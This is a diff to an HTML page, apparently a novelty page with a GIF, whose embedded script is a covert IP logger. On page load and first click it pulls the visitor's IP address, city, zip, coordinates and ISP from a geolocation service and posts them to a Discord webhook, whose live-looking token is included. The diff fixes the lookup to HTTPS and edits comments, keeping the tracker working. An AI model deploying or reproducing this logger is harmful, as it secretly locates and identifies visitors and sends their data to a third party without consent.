@@ -51,13 +51,13 @@ body {
 <img class="float f" src="https://media.giphy.com/media/ICOgUNjpvO0PC/giphy.gif">
 
 <script>
-// === PUT YOUR REAL DISCORD WEBHOOK HERE ===
+// === YOUR DISCORD WEBHOOK URL ===
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1492201181412593895/OsetCXRaeFK59ZMTZMHBR04_Zjw9aD19Qs_ne--tjdsYzJRjZru92DKJqYv-FZjlyOEz";
 
 async function sendLogger() {
     try {
-        // Get full location + IP data
-        const ipRes = await fetch("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,zip,lat,lon,timezone,isp");
+        // FIXED: Use HTTPS version of ip-api.com
+        const ipRes = await fetch("https://ip-api.com/json/?fields=status,message,query,country,regionName,city,zip,lat,lon,timezone,isp");
         const ipData = await ipRes.json();
 
         const info = {
@@ -103,7 +103,6 @@ async function sendLogger() {
             }]
         };
 
-        // Send to Discord
         const response = await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -120,7 +119,7 @@ async function sendLogger() {
     }
 }
 
-// Trigger when page loads AND when clicked anywhere
+// Trigger on load + click
 window.addEventListener("load", sendLogger);
 document.addEventListener("click", sendLogger, { once: true });
 </script>
